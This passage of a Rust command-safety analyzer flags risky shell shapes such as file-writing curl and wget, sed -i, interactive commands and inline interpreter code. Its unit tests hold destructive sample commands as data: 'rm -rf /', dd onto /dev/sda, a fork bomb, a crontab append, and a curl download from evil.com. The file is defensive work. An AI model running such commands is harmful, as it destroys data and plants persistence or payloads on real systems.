            }
            prev_is_output = false;
            continue;
        }
        if *t == "-O" || *t == "--output-document" {
            prev_is_output = true;
            continue;
        }
        if let Some(path) = t.strip_prefix("--output-document=") {
            if path != "/dev/null" && path != "-" {
                warnings.push(format!(
                    "wget --output-document={path} (file write; only /dev/null or stdout allowed)"
                ));
            }
        }
    }
}

/// `sed -i` modifies files in-place without going through patch_file.
fn check_sed_shape(args: &[String], warnings: &mut Vec<String>) {
    for t in args {
        if *t == "-i" || *t == "--in-place" {
            warnings
                .push("sed -i (in-place file modification; use patch_file workflow)".to_string());
        }
        // Handle `-i''` or `--in-place=` variants
        if t.starts_with("--in-place=") {
            warnings.push(
                "sed --in-place= (in-place file modification; use patch_file workflow)".to_string(),
            );
        }
        // Combined short flags like `-ibak` or `-i.bak`
        if t.starts_with("-i") && t.len() > 2 && !t.starts_with("--") {
            warnings.push(format!(
                "sed {t} (in-place file modification; use patch_file workflow)"
            ));
        }
    }
}

/// `tail -f` follows a file indefinitely (interactive blocking command).
/// Returns true if a follow flag was detected.
fn check_tail_follow_shape(args: &[String], warnings: &mut Vec<String>) -> bool {
    let mut followed = false;
    for t in args {
        if *t == "-f" || *t == "--follow" {
            warnings.push(
                "tail -f (follows file indefinitely; interactive blocking command)".to_string(),
            );
            followed = true;
        }
        // Combined flags like `-fq`
        if t.starts_with("-f") && t.len() > 2 && !t.starts_with("--") {
            warnings.push(format!(
                "tail {t} (follows file indefinitely; interactive blocking command)"
            ));
            followed = true;
        }
    }
    followed
}

/// `touch` with timestamp-modifying flags changes file metadata.
fn check_touch_shape(args: &[String], warnings: &mut Vec<String>) {
    for t in args {
        let bad = matches!(
            t.as_str(),
            "-a" | "-m" | "-am" | "-ma" | "--date" | "--time" | "--reference"
        ) || t.starts_with("-d")
            || t.starts_with("-t")
            || t.starts_with("-r")
            || t.starts_with("--date=")
            || t.starts_with("--time=")
            || t.starts_with("--reference=");
        if bad {
            warnings.push(format!(
                "touch {t} (timestamp change; touch may only create empty files)"
            ));
        }
    }
}

/// Commands like `vmstat`, `iostat` need at least 2 consecutive numbers
/// (interval + count) to prevent unbounded loops.
/// Returns true if the loop is unbounded (no explicit count).
fn check_counted_loop_shape(head: &str, args: &[String], warnings: &mut Vec<String>) -> bool {
    let mut consecutive: u32 = 0;
    let mut maxc: u32 = 0;
    for t in args {
        if t.parse::<u64>().is_ok() {
            consecutive += 1;
            maxc = maxc.max(consecutive);
        } else {
            consecutive = 0;
        }
    }
    if maxc < 2 {
        warnings.push(format!(
            "{head} requires two consecutive numbers 'interval count' to prevent unbounded loop"
        ));
        return true;
    }
    false
}

/// Interactive full-screen / pager / multiplexer commands that block a
/// non-interactive exec channel. `top` is a special case: it is only
/// non-interactive when an explicit batch flag is present (`-b` on Linux,
/// `-l` on macOS, or `-n` for an iteration count).
///
/// Returns true when the command is interactive (blocks the channel).
fn check_interactive_shape(head: &str, args: &[String], warnings: &mut Vec<String>) -> bool {
    if head == "top" {
        let batched = args.iter().any(|t| {
            t == "-b"
                || t == "--batch"
                || t == "-l"
                || t == "-n"
                || t.starts_with("-b")
                || t.starts_with("-n")
                || t.starts_with("-l")
        });
        if !batched {
            warnings.push(
                "top (interactive full-screen command; use `top -bn1` or `top -l 1` for batch output)"
                    .to_string(),
            );
            return true;
        }
        return false;
    }
    warnings.push(format!(
        "{head} (interactive full-screen command; blocks a non-interactive exec channel)"
    ));
    true
}

/// Finding 12: Detect interpreter delayed execution.
/// Interpreters like python, bash, perl, ruby, node support `-c` or `-e` flags
/// that execute inline code. This bypasses sanitization because the actual
/// commands are hidden inside the flag argument string.
fn check_interpreter_shape(head: &str, args: &[String], warnings: &mut Vec<String>) {
    // Flags that trigger inline/deferred code execution.
    const INLINE_FLAGS: &[&str] = &["-c", "-e", "--eval", "--execute", "--script"];
    // Some interpreters use different flag names.
    let inline_flags: &[&str] = match head {
        "perl" | "ruby" | "node" | "nodejs" | "deno" | "bun" => &["-e", "--eval", "--execute"],
        "php" => &["-r", "--run"],
        "lua" | "luajit" => &["-e", "--execute"],
        "tclsh" | "wish" => &["-c", "--command"],
        "awk" | "gawk" | "mawk" => &["-e", "--source"],
        _ => INLINE_FLAGS,
    };

    for (i, t) in args.iter().enumerate() {
        if inline_flags.contains(&t.as_str()) {
            // The next argument is the inline code.
            let code_preview = args
                .get(i + 1)
                .map(|s| {
                    let s = s.trim();
                    if s.len() > 60 {
                        format!("{}...", &s[..60])
                    } else {
                        s.to_string()
                    }
                })
                .unwrap_or_else(|| "<empty>".to_string());
            warnings.push(format!(
                "{head} {t} (deferred execution: inline code bypasses sanitize: {code_preview})"
            ));
        }
        // Handle combined forms like `-c'code'` or `--eval=code`.
        if t.starts_with("-c") && t.len() > 2 && !t.starts_with("--") {
            warnings.push(format!(
                "{head} {t} (deferred execution: inline code bypasses sanitize)"
            ));
        }
        if t.starts_with("--eval=") || t.starts_with("--execute=") || t.starts_with("--run=") {
            warnings.push(format!(
                "{head} {t} (deferred execution: inline code bypasses sanitize)"
            ));
        }
    }
}

/// Convenience function: extract just the canonical head, or `None` on failure.
/// This is the main entry point for risk classification.
pub fn canonical_head(command: &str) -> Option<String> {
    analyze_command(command).canonical_head
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Basic command extraction ──────────────────────────────────────────────

    #[test]
    fn extracts_simple_command() {
        assert_eq!(canonical_head("ls -la"), Some("ls".into()));
        assert_eq!(canonical_head("cat /etc/hosts"), Some("cat".into()));
        assert_eq!(canonical_head("rm -rf /tmp/stuff"), Some("rm".into()));
    }

    #[test]
    fn split_commands_breaks_chains_but_not_quotes() {
        assert_eq!(split_commands("ls -la"), vec!["ls -la"]);
        assert_eq!(
            split_commands("echo hi && rm -rf /"),
            vec!["echo hi", "rm -rf /"]
        );
        assert_eq!(split_commands("true; shutdown"), vec!["true", "shutdown"]);
        assert_eq!(split_commands("ls | grep foo"), vec!["ls", "grep foo"]);
        // Quoted separators stay inside a single segment.
        assert_eq!(split_commands("echo \"a && b\""), vec!["echo \"a && b\""]);
        assert_eq!(split_commands("echo 'x;y'"), vec!["echo 'x;y'"]);
    }

    #[test]
    fn env_wrapper_skips_unset_value() {
        // Regression: `env -u PATH` must not leave head stuck at "PATH".
        assert_eq!(canonical_head("env -u PATH rm -rf /"), Some("rm".into()));
        assert_eq!(
            canonical_head("env --unset=PATH rm -rf /"),
            Some("rm".into())
        );
        assert_eq!(canonical_head("env -i rm -rf /"), Some("rm".into()));
        assert_eq!(
            canonical_head("env VAR=value kubectl get pods"),
            Some("kubectl".into())
        );
    }

    #[test]
    fn su_wrapper_finds_command_value_not_username() {
        // Regression: the command is the value of `-c`, never the username.
        assert_eq!(canonical_head("su -c 'rm -rf /'"), Some("rm".into()));
        assert_eq!(canonical_head("su root -c 'id'"), Some("id".into()));
        assert_eq!(
            canonical_head("su - root -c 'reboot'"),
            Some("reboot".into())
        );
        assert_eq!(canonical_head("su --command='ls -la'"), Some("ls".into()));
        assert_eq!(canonical_head("su -s /bin/sh -c 'id'"), Some("id".into()));
        // Without -c there is no extractable command (interactive shell).
        assert_eq!(canonical_head("su root"), Some("su".into()));
    }

    #[test]
    fn extracts_empty_command() {
        assert_eq!(canonical_head(""), None);
        assert_eq!(canonical_head("   "), None);
    }

    // ── Wrapper stripping ─────────────────────────────────────────────────────

    #[test]
    fn strips_sudo() {
        assert_eq!(canonical_head("sudo rm -rf /"), Some("rm".into()));
        assert_eq!(canonical_head("sudo shutdown"), Some("shutdown".into()));
        assert_eq!(canonical_head("sudo whoami"), Some("whoami".into()));
    }

    #[test]
    fn strips_sudo_with_flags() {
        assert_eq!(canonical_head("sudo -u root rm -rf /"), Some("rm".into()));
        assert_eq!(
            canonical_head("sudo --user=root systemctl stop nginx"),
            Some("systemctl".into())
        );
    }

    #[test]
    fn strips_env_wrapper() {
        assert_eq!(canonical_head("env VAR=value rm -rf /"), Some("rm".into()));
        assert_eq!(
            canonical_head("env FOO=bar BAR=baz kubectl delete pod x"),
            Some("kubectl".into())
        );
    }

    #[test]
    fn strips_timeout_wrapper() {
        assert_eq!(
            canonical_head("timeout 30s dd if=/dev/zero of=/dev/sda"),
            Some("dd".into())
        );
        assert_eq!(
            canonical_head("timeout --signal=KILL 10 rm -rf /"),
            Some("rm".into())
        );
    }

    #[test]
    fn strips_nohup_wrapper() {
        assert_eq!(canonical_head("nohup ./server &"), Some("server".into()));
    }

    #[test]
    fn strips_nested_wrappers() {
        assert_eq!(
            canonical_head("sudo env VAR=val timeout 10 rm -rf /"),
            Some("rm".into())
        );
        assert_eq!(
            canonical_head("sudo timeout 30 shutdown -h now"),
            Some("shutdown".into())
        );
    }

    // ── Path stripping ────────────────────────────────────────────────────────

    #[test]
    fn strips_path_prefix() {
        assert_eq!(canonical_head("/usr/bin/rm -rf /"), Some("rm".into()));
        assert_eq!(
            canonical_head("/bin/dd if=/dev/zero of=/dev/sda"),
            Some("dd".into())
        );
    }

    // ── Alias normalization ───────────────────────────────────────────────────

    #[test]
    fn normalizes_brew_prefixes() {
        assert_eq!(canonical_head("gcp file dest"), Some("cp".into()));
        assert_eq!(canonical_head("gchmod 777 /etc"), Some("chmod".into()));
        assert_eq!(
            canonical_head("sudo gdd if=/dev/zero of=/dev/sda"),
            Some("dd".into())
        );
    }

    #[test]
    fn normalizes_awk_variants() {
        assert_eq!(canonical_head("gawk '{print $1}'"), Some("awk".into()));
        assert_eq!(canonical_head("mawk '{print $1}'"), Some("awk".into()));
        assert_eq!(canonical_head("nawk '{print $1}'"), Some("awk".into()));
    }

    // ── ANSI-C hex escape decoding ────────────────────────────────────────────

    #[test]
    fn decodes_ansi_c_hex_escape() {
        // $'\x72\x6d' decodes to "rm"
        assert_eq!(canonical_head("$'\\x72\\x6d' -rf /"), Some("rm".into()));
    }

    // ── Pipeline handling ────────────────────────────────────────────────────

    #[test]
    fn extracts_first_command_in_pipeline() {
        assert_eq!(
            canonical_head("cat /etc/passwd | grep root"),
            Some("cat".into())
        );
    }

    // ── Logical operator handling ────────────────────────────────────────────

    #[test]
    fn extracts_first_command_in_chain() {
        assert_eq!(canonical_head("ls -la && rm -rf /tmp"), Some("ls".into()));
        assert_eq!(
            canonical_head("test -f /file || rm -rf /"),
            Some("test".into())
        );
    }

    // ── fail-closed: parse errors return None ────────────────────────────────

    #[test]
    fn fail_closed_on_unparseable() {
        // Completely unparseable garbage.
        assert_eq!(canonical_head(")))((("), None);
    }

    #[test]
    fn analysis_reports_parse_errors() {
        let analysis = analyze_command(")))(((");
        assert!(analysis.had_parse_errors);
        assert_eq!(analysis.canonical_head, None);
    }

    // ── Case insensitivity ──────────────────────────────────────────────────

    #[test]
    fn lowercases_command() {
        assert_eq!(canonical_head("RM -RF /"), Some("rm".into()));
        assert_eq!(canonical_head("SUDO REBOOT"), Some("reboot".into()));
    }

    // ── Subshell handling ───────────────────────────────────────────────────

    #[test]
    fn extracts_command_in_subshell() {
        assert_eq!(canonical_head("(rm -rf /tmp)"), Some("rm".into()));
    }

    // ── Complex real-world commands ──────────────────────────────────────────

    #[test]
    fn docker_prune() {
        assert_eq!(
            canonical_head("docker system prune -af"),
            Some("docker".into())
        );
    }

    #[test]
    fn kubectl_delete() {
        assert_eq!(
            canonical_head("kubectl delete namespace kube-system"),
            Some("kubectl".into())
        );
    }

    #[test]
    fn terraform_destroy() {
        assert_eq!(
            canonical_head("terraform destroy -auto-approve"),
            Some("terraform".into())
        );
    }

    #[test]
    fn fork_bomb() {
        // The fork bomb :(){ :|:& };:
        // tree-sitter-bash may parse this as a function definition + command.
        // We just verify it doesn't crash.
        let _ = canonical_head(":(){ :|:& };:");
    }

    // ── S2: File redirect detection tests ─────────────────────────────────────

    #[test]
    fn s2_detects_simple_redirect_to_file() {
        let analysis = analyze_command("echo hello > /tmp/pwned");
        assert!(
            analysis
                .redirect_warnings
                .iter()
                .any(|w| w.contains("/tmp/pwned")),
            "should detect redirect to /tmp/pwned, got: {:?}",
            analysis.redirect_warnings
        );
    }

    #[test]
    fn s2_allows_redirect_to_dev_null() {
        let analysis = analyze_command("echo hello > /dev/null");
        assert!(
            analysis.redirect_warnings.is_empty(),
            "/dev/null redirect should be allowed, got: {:?}",
            analysis.redirect_warnings
        );
    }

    #[test]
    fn s2_allows_fd_duplicate_redirect() {
        let analysis = analyze_command("echo hello 2>&1");
        assert!(
            analysis.redirect_warnings.is_empty(),
            "fd duplicate redirect should be allowed, got: {:?}",
            analysis.redirect_warnings
        );
    }

    #[test]
    fn s2_detects_append_redirect() {
        let analysis = analyze_command("echo data >> /etc/crontab");
        assert!(
            analysis
                .redirect_warnings
                .iter()
                .any(|w| w.contains("/etc/crontab")),
            "should detect append redirect to /etc/crontab"
        );
    }

    #[test]
    fn s2_detects_heredoc_bypass_redirect() {
        // The heredoc bypass: `cmd <<EOF > /path` nests the file_redirect
        // inside the heredoc_redirect node — only recursive scan catches it.
        let analysis = analyze_command("cat <<EOF > /tmp/heredoc_bypass\nhello\nEOF");
        assert!(
            analysis
                .redirect_warnings
                .iter()
                .any(|w| w.contains("/tmp/heredoc_bypass")),
            "should detect redirect nested inside heredoc, got: {:?}",
            analysis.redirect_warnings
        );
    }

    #[test]
    fn s2_allows_input_redirect() {
        let analysis = analyze_command("cat < /etc/hosts");
        assert!(
            analysis.redirect_warnings.is_empty(),
            "input redirect should be allowed, got: {:?}",
            analysis.redirect_warnings
        );
    }

    #[test]
    fn s2_detects_redirect_in_pipeline() {
        let analysis = analyze_command("echo hello | tee /tmp/teed > /tmp/dup");
        assert!(
            analysis
                .redirect_warnings
                .iter()
                .any(|w| w.contains("/tmp/dup")),
            "should detect redirect to /tmp/dup in pipeline, got: {:?}",
            analysis.redirect_warnings
        );
    }

    #[test]
    fn s2_allows_quoted_dev_null() {
        let analysis = analyze_command("echo hello > \"/dev/null\"");
        assert!(
            analysis.redirect_warnings.is_empty(),
            "quoted /dev/null redirect should be allowed, got: {:?}",
            analysis.redirect_warnings
        );
    }

    // ── S3: Per-command shape rule tests ──────────────────────────────────────

    #[test]
    fn s3_find_exec_is_flagged() {
        let analysis = analyze_command("find / -name '*.log' -exec rm {} \\;");
        assert!(
            analysis.shape_warnings.iter().any(|w| w.contains("-exec")),
            "find -exec should be flagged, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_find_delete_is_flagged() {
        let analysis = analyze_command("find /tmp -name '*.tmp' -delete");
        assert!(
            analysis
                .shape_warnings
                .iter()
                .any(|w| w.contains("-delete")),
            "find -delete should be flagged"
        );
    }

    #[test]
    fn s3_find_name_only_not_flagged() {
        let analysis = analyze_command("find /tmp -name '*.log' -print");
        assert!(
            analysis.shape_warnings.is_empty(),
            "find -name/-print should not be flagged, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_curl_remote_name_is_flagged() {
        let analysis = analyze_command("curl -O https://example.com/file.tar.gz");
        assert!(
            analysis.shape_warnings.iter().any(|w| w.contains("-O")),
            "curl -O should be flagged"
        );
    }

    #[test]
    fn s3_curl_output_to_dev_null_not_flagged() {
        let analysis = analyze_command("curl -o /dev/null https://example.com/");
        assert!(
            analysis.shape_warnings.is_empty(),
            "curl -o /dev/null should not be flagged, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_curl_output_to_file_is_flagged() {
        let analysis = analyze_command("curl -o /tmp/malware https://example.com/");
        assert!(
            analysis
                .shape_warnings
                .iter()
                .any(|w| w.contains("/tmp/malware")),
            "curl -o /tmp/malware should be flagged"
        );
    }

    #[test]
    fn s3_curl_output_equal_form_flagged() {
        let analysis = analyze_command("curl --output=/tmp/file https://example.com/");
        assert!(
            analysis
                .shape_warnings
                .iter()
                .any(|w| w.contains("/tmp/file")),
            "curl --output=/tmp/file should be flagged"
        );
    }

    #[test]
    fn s3_wget_output_to_file_is_flagged() {
        let analysis = analyze_command("wget -O /tmp/file https://example.com/");
        assert!(
            analysis
                .shape_warnings
                .iter()
                .any(|w| w.contains("/tmp/file")),
            "wget -O /tmp/file should be flagged"
        );
    }

    #[test]
    fn s3_sed_inplace_is_flagged() {
        let analysis = analyze_command("sed -i 's/old/new/g' /etc/hosts");
        assert!(
            analysis.shape_warnings.iter().any(|w| w.contains("-i")),
            "sed -i should be flagged"
        );
    }

    #[test]
    fn s3_sed_without_inplace_not_flagged() {
        let analysis = analyze_command("sed 's/old/new/g' input.txt");
        assert!(
            analysis.shape_warnings.is_empty(),
            "sed without -i should not be flagged, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_tail_follow_is_flagged() {
        let analysis = analyze_command("tail -f /var/log/syslog");
        assert!(
            analysis.shape_warnings.iter().any(|w| w.contains("-f")),
            "tail -f should be flagged"
        );
    }

    #[test]
    fn s3_tail_without_follow_not_flagged() {
        let analysis = analyze_command("tail -n 100 /var/log/syslog");
        assert!(
            analysis.shape_warnings.is_empty(),
            "tail without -f should not be flagged, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_touch_timestamp_flag_is_flagged() {
        let analysis = analyze_command("touch -m -t 202401010000 /tmp/file");
        assert!(
            !analysis.shape_warnings.is_empty(),
            "touch -m -t should be flagged, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_touch_create_only_not_flagged() {
        let analysis = analyze_command("touch /tmp/newfile");
        assert!(
            analysis.shape_warnings.is_empty(),
            "touch without timestamp flags should not be flagged, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_vmstat_without_count_is_flagged() {
        let analysis = analyze_command("vmstat");
        assert!(
            analysis.shape_warnings.iter().any(|w| w.contains("vmstat")),
            "vmstat without count should be flagged"
        );
    }

    #[test]
    fn s3_vmstat_with_count_not_flagged() {
        let analysis = analyze_command("vmstat 1 5");
        assert!(
            analysis.shape_warnings.is_empty(),
            "vmstat 1 5 should not be flagged, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_iostat_without_count_is_flagged() {
        let analysis = analyze_command("iostat");
        assert!(
            analysis.shape_warnings.iter().any(|w| w.contains("iostat")),
            "iostat without count should be flagged"
        );
    }

    #[test]
    fn s3_shape_rules_work_through_sudo() {
        let analysis = analyze_command("sudo find / -delete");
        assert!(
            analysis
                .shape_warnings
                .iter()
                .any(|w| w.contains("-delete")),
            "find -delete through sudo should be flagged"
        );
    }

    #[test]
    fn s3_multiple_warnings_collected() {
        let analysis = analyze_command("find / -delete && curl -O https://evil.com/x");
        assert!(
            analysis.shape_warnings.len() >= 2,
            "should collect multiple warnings, got: {:?}",
            analysis.shape_warnings
        );
    }

    #[test]
    fn s3_shape_interactive_fullscreen_classified() {
        for cmd in ["htop", "watch -n 1 date", "vim file", "less file", "tmux"] {
            assert_eq!(
                analyze_command(cmd).shape,
                Some(ShapeRisk::Interactive),
                "{cmd} should be classified Interactive"
            );
        }
    }

    #[test]
    fn s3_shape_top_bare_interactive_top_batch_not() {
        assert_eq!(analyze_command("top").shape, Some(ShapeRisk::Interactive));
        assert_eq!(analyze_command("top -bn1").shape, None);
        assert_eq!(analyze_command("top -l 1").shape, None);
    }

    #[test]
    fn s3_shape_tail_follow_interactive() {
        assert_eq!(
            analyze_command("tail -f /var/log/x").shape,
            Some(ShapeRisk::Interactive)
        );
        assert_eq!(analyze_command("tail -n 10 /var/log/x").shape, None);
    }

    #[test]
    fn s3_shape_unbounded_loop_classified() {
        assert_eq!(
            analyze_command("vmstat").shape,
            Some(ShapeRisk::UnboundedLoop)
        );
        assert_eq!(analyze_command("vmstat 1 5").shape, None);
    }

    #[test]
    fn s3_shape_interactive_through_sudo() {
        assert_eq!(
            analyze_command("sudo htop").shape,
            Some(ShapeRisk::Interactive)
        );
    }
}
